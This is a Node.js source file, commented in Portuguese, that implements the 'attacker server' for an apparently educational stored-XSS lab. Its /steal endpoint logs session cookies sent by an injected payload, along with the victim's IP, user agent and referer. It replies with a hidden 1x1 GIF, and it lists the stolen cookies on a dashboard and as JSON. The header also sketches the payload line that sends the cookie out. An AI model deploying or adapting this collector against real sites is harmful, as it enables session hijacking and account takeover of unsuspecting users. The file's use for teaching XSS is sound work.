/*
 * ============================================================================
 *  COLETOR DE COOKIES — "servidor do atacante" (laboratório educacional)
 * ============================================================================
 *  Papel na demonstração: recebe os cookies de sessão roubados pelo payload de
 *  XSS armazenado que executa no navegador da vítima. Fica dentro da rede
 *  isolada do laboratório (publicado só em 127.0.0.1). Nenhum dado sai da máquina.
 *
 *  Endpoints:
 *    GET /steal?c=<cookie>  -> registra o cookie recebido e responde um GIF 1x1
 *                              (o payload costuma usar new Image().src = .../steal?c=...).
 *    GET /                  -> painel simples com os cookies capturados.
 *    GET /dados             -> os mesmos dados em JSON.
 *
 *  Usa somente módulos nativos do Node (http, fs, url): sem dependências.
 * ============================================================================
 */
const http = require('http');
const fs = require('fs');
const path = require('path');
const { URL } = require('url');

const PORT = process.env.PORT || 3009;
const LOG_PATH = process.env.LOG_PATH || path.join(__dirname, 'data', 'cookies.log');
fs.mkdirSync(path.dirname(LOG_PATH), { recursive: true });

// GIF transparente de 1x1 pixel (resposta discreta ao payload).
const GIF_1x1 = Buffer.from(
  'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
  'base64'
);

// Carrega capturas anteriores (persistência entre reinícios do container).
const captured = [];
try {
  const prev = fs.readFileSync(LOG_PATH, 'utf8').trim();
  if (prev) for (const line of prev.split('\n')) captured.push(JSON.parse(line));
} catch (_) {
  /* arquivo ainda não existe */
}

function escapeHtml(s) {
  return String(s).replace(/[&<>"']/g, (c) => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
  }[c]));
}

const server = http.createServer((req, res) => {
  const u = new URL(req.url, `http://localhost:${PORT}`);

  // --- Recebe o cookie roubado ---------------------------------------------
  if (u.pathname === '/steal') {
    const entry = {
      time: new Date().toISOString(),
      ip: req.socket.remoteAddress,
      ua: req.headers['user-agent'] || '',
      referer: req.headers['referer'] || '',
      cookie: u.searchParams.get('c') || '',
    };
    captured.push(entry);
    fs.appendFileSync(LOG_PATH, JSON.stringify(entry) + '\n');
    console.log('[COOKIE CAPTURADO]', entry);
    res.writeHead(200, { 'Content-Type': 'image/gif', 'Cache-Control': 'no-store' });
    return res.end(GIF_1x1);
  }

  // --- Dados em JSON --------------------------------------------------------
  if (u.pathname === '/dados') {
    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
    return res.end(JSON.stringify(captured, null, 2));
  }

  // --- Painel do atacante ---------------------------------------------------
  if (u.pathname === '/') {
    const linhas = captured
      .slice()
      .reverse()
      .map(
        (e) => `<tr>
          <td>${escapeHtml(e.time)}</td>
          <td>${escapeHtml(e.ip)}</td>
          <td><code>${escapeHtml(e.cookie)}</code></td>
          <td>${escapeHtml(e.referer)}</td>
        </tr>`
      )
      .join('');
    const html = `<!DOCTYPE html>
<html lang="pt-br"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Coletor de Cookies (atacante)</title>
<style>
  body{font-family:system-ui,sans-serif;background:#111827;color:#e5e7eb;margin:0;padding:24px}
  h1{margin-top:0} .sub{color:#9ca3af}
  table{width:100%;border-collapse:collapse;margin-top:16px}
  th,td{border:1px solid #374151;padding:8px;text-align:left;vertical-align:top;font-size:14px}
  th{background:#1f2937} code{color:#fca5a5;word-break:break-all}
  .vazio{color:#9ca3af;margin-top:16px}
</style></head>
<body>
  <h1>🎣 Coletor de Cookies <span class="sub">(servidor do atacante — laboratório)</span></h1>
  <p class="sub">${captured.length} captura(s). Atualize a página após disparar o ataque.</p>
  ${
    captured.length
      ? `<table><thead><tr><th>Horário (UTC)</th><th>IP</th><th>Cookie roubado</th><th>Origem (Referer)</th></tr></thead><tbody>${linhas}</tbody></table>`
      : '<p class="vazio">Nenhum cookie capturado ainda.</p>'
  }
</body></html>`;
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(html);
  }

  res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end('not found');
});

server.listen(PORT, () => {
  console.log(`[COLETOR] Ouvindo na porta ${PORT} — painel em http://localhost:${PORT}`);
});
